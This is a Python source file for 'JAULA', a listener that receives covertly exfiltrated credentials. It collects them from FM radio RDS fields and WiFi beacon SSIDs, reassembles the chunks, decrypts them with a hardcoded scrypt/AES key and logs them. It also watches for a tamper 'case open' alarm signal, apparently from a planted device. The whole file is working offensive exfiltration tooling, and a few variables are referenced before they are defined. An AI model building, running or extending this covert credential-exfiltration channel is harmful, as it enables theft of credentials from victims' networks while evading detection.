#!/usr/bin/env python3
import os
import re
import sys
import time
import pyaes
import pyscrypt
import argparse
import threading
import subprocess
import logging
import collections
from pyfiglet import Figlet
from scapy.all import *


# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "2.020"

# Config
PHRASE = b'Waaaaa! awesome :)'
SALT = b'salgruesa'
MAGIC = b'0666'
SSIDROOT = b'nec-c17c02'
SSIDALARM = b'pacman'
CHANNEL = '10'


# PTY Codes (Europe https://en.wikipedia.org/wiki/Radio_Data_System)
ptycodes = {
    0: b'Undefined',
    1: b'News',
    2: b'Current',
    3: b'Information',
    4: b'Sport',
    5: b'Education',
    6: b'Drama',
    7: b'Culture',
    8: b'Science',
    9: b'Varied',
    10: b'Pop',
    11: b'Rock',
    12: b'Easy',
    13: b'Light',
    14: b'Serious',
    15: b'Other',
    16: b'Weather',
    17: b'Finance',
    18: b'Children',
    19: b'Social',
    20: b'Religion',
    21: b'Phone-In',
    22: b'Travel',
    23: b'Leisure',
    24: b'Jazz',
    25: b'Country',
    26: b'National',
    27: b'Oldies',
    28: b'Folk',
    29: b'Documentary',
    30: b'Alarm'
}


# Classes
class FMHandler(threading.Thread):
    def __init__(self, args):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.freq, self.logfile = args
        self.cmd = './tools/rds_rx.py'
        self.dic = {}
        self.pkttotal = 200
        self.block = 0
        self.blockcnt = 0
        self.traffic = False
        self.sync = True
        self.proc = ''

    def run(self):
        """
        First packet: PI = crypto_len, PTY = News (PTY 1), Amount of pkts is crypto_len / 4 + pading
        Second packet+N: PTY = pkt_num (1-30), PI = chuck (AAAA-FFFF), PTY != 31 (Alarm)
        If more than 30 packets, then "block" will be used every 30 chunks and stitch together
        Example:
        00A (BASIC) - PI:AB4F - PTY:Current Affairs (country:AT/GI/IS/LB/__, area:Regional 8, program:79)
        """

        self.proc = subprocess.Popen(self.cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        while not self.stoprequest.isSet():
            line = self.proc.stdout.readline()
            m = re.findall(b'PI:(.*) - PTY:(.*) \(', line)
            if m:
                pi, pty = m[0]
                if pty == b'Alarm' and pi == MAGIC:
                    printalarm(self.logfile)
                if pty == b'Alarm' and self.sync:
                    try:
                        self.pktlen = int(pi)
                        if self.pktlen % 4 != 0:
                            self.pkttotal = int(self.pktlen / 4 + 1)
                        else:
                            self.pkttotal = int(self.pktlen / 4)
                        self.sync = False
                        self.traffic = True
                        self.dic = {}
                    except(ValueError):
                        pass
                elif pty != b'Alarm' and pty != b'Undefined' and self.traffic:
                    idx = lookup(pty.decode())
                    if idx:
                        idx = idx + self.block
                        if idx not in self.dic:
                            self.dic[idx] = pi
                            notdef = True
                elif pty == b'Undefined' and pi == b'0000' and traffic and notdef:
                    self.blockcnt += 1
                    self.block = self.blockcnt * 30
                    notdef = False

            if len(self.dic) == self.pkttotal:
                odic = collections.OrderedDict(sorted(self.dic.items()))
                final = b''
                for k, v in odic.items():
                    final = final + v
                try:
                    cleartxt = decrypt(final[:self.pktlen].decode())
                    if not cleartxt.startswith('v,'):
                        hexip = cleartxt.split(',')[-1]
                        cleartxt = cleartxt.replace(hexip, hextoip(hexip))
                    print('Credentials via FM found:')
                    printer(self.logfile, cleartxt)
                except(UnicodeDecodeError):
                    print('Malformed Crypto')

                self.dic = {}
                self.pkttotal = 200
                self.traffic = False
                self.block = 0
                self.blockcnt = 0
                self.sync = True

    # Stop Function
    def join(self):
        self.proc.kill()
        self.stoprequest.set()


class WifiHandler(threading.Thread):
    def __init__(self, args):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.iface, self.logfile = args
        self.dic = {}
        self.pkttotal = 0
        self.pktlen = 0
        self.cnt = True
        self.sid = []

    def pkt_callback(self, pkt):
        # Look for beacon with SSIDROOT as starting SSID
        # grab crypto len & amount of SSID's with crypto on it (use -g on those)
        if pkt.haslayer(Dot11Beacon):
            if (pkt[Dot11Elt].info == SSIDALARM) and (pkt[Dot11].SC == MAGIC):
                self.stoprequest.set()
                printalarm(self.logfile)
            if (pkt[Dot11Elt].info == SSIDROOT) and (self.cnt):
                self.pkttotal = pkt[Dot11].SC
                self.pktlen = pkt[Dot11Beacon].beacon_interval
                self.cnt = False
            elif (b'nec' and b'-g' in pkt[Dot11Elt].info):
                if pkt[Dot11Beacon].beacon_interval == self.pktlen:
                    if str(pkt[Dot11Elt].info).split('-')[1] not in self.sid:
                        self.dic[pkt[Dot11].SC] = str(pkt[Dot11Elt].info).split('-')[1]
                        self.sid.append(str(pkt[Dot11Elt].info).split('-')[1])
            if (len(self.dic) == self.pkttotal) and (self.pkttotal > 0):
                odic = collections.OrderedDict(sorted(self.dic.items()))
                final = ''
                for k, v in odic.items():
                    final = final + v
                try:
                    cleartxt = decrypt(final[:self.pktlen])
                    if not cleartxt.startswith('v,'):
                        hexip = cleartxt.split(',')[-1]
                        cleartxt = cleartxt.replace(hexip, hextoip(hexip))
                    print('Credentials via Wifi found:')
                    printer(self.logfile, cleartxt)
                except(UnicodeDecodeError):
                    print('Malformed Crypto')
                self.dic = {}
                self.sid = []
                self.pktlen = 0
                self.pkttotal = 0
                self.cnt = True

    def run(self):
        while not self.stoprequest.isSet():
            sniff(iface=self.iface, prn=self.pkt_callback, store=0)

    # Stop Function
    def join(self):
        self.stoprequest.set()


# Define Funtions
def lookup(pty):
    for k, v in ptycodes.items():
        if pty.startswith(v.decode()):
            return k
    return None

def hextoip(ip):
    n = 2
    return '.'.join([str(int(ip[i:i+n], 16)) for i in range(0, len(ip), n)])

def decrypt(ciphertxt):
    key = pyscrypt.hash(PHRASE, SALT, 1024, 1, 1, 16)
    aes = pyaes.AESModeOfOperationCTR(key)
    cleartxt = aes.decrypt(bytes.fromhex(ciphertxt))
    return cleartxt.decode()

def printer(fd, text):
    print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime()) + text)
    find = re.compile('\\b' + text + '\\b')
    with open(fd, 'a+') as sfile:
        with open(fd, 'r') as xfile:
            m = find.findall(xfile.read())
            if not m:
                sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime()) + text + '\n')

def printalarm(fd):
    text = 'ALARM Case Open!'
    with open(fd, 'a+') as sfile:
        sfile.write(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime()) + text + '\n')
    print(time.strftime("%Y-%m-%d %H:%M:%S ", time.gmtime()) + text)
    print('Sayonara')
    os._exit(1)

def wifimon(iface, channel):
    with open(os.devnull, 'w') as fdnull:
        subprocess.call(['ip', 'link', 'set', iface, 'down'], stdout=fdnull, stderr=subprocess.STDOUT)
        time.sleep(0.3)
        subprocess.call(['iw', iface, 'set', 'monitor', 'control'], stdout=fdnull, stderr=subprocess.STDOUT)
        time.sleep(0.3)
        subprocess.call(['ip', 'link', 'set', iface, 'up'], stdout=fdnull, stderr=subprocess.STDOUT)
        time.sleep(0.3)
        subprocess.call(['iw', iface, 'set', 'channel', channel], stdout=fdnull, stderr=subprocess.STDOUT)

def parsingopt():
    f = Figlet(font='standard')
    print(f.renderText('JAULA'))
    print('Author: {}'.format(__author__))
    print('Version: {}\n'.format(__version__))

    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable debugging')
    parser.add_argument('-f', dest='freq', metavar='<87.6>',
                        help='FM Freq')
    parser.add_argument('-w', dest='iface', metavar='<wlan0>',
                        help='Wireles interface')
    parser.add_argument('-l', required=True, dest='logfile', metavar='<logfile>',
                        help='Log File')
    if len(sys.argv) > 1:
        try:
            return parser.parse_args()
        except(argparse.ArgumentError):
            parser.error()
    else:
        parser.print_help()
        sys.exit(1)


def main():

    options = parsingopt()
    if options.verbose:
        logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.DEBUG)
    if options.freq:
        logging.debug('Listing FM Freq: {}'.format(options.freq))
        fmdh = FMHandler((options.freq, options.logfile))
        fmdh.daemon = True
        fmdh.start()
    if options.iface:
        logging.debug('Listing Wireless Channel: {}'.format(CHANNEL))
        wifimon(options.iface, CHANNEL)
        wifidh = WifiHandler((options.iface, options.logfile))
        wifidh.daemon = True
        wifidh.start()

    print('Listening....')
    try:
        while True:
            time.sleep(300)
    except(KeyboardInterrupt):
        if options.freq:
            fmdh.join()
        if options.iface:
            wifidh.join()

# Call main
if __name__ == '__main__':
    main()
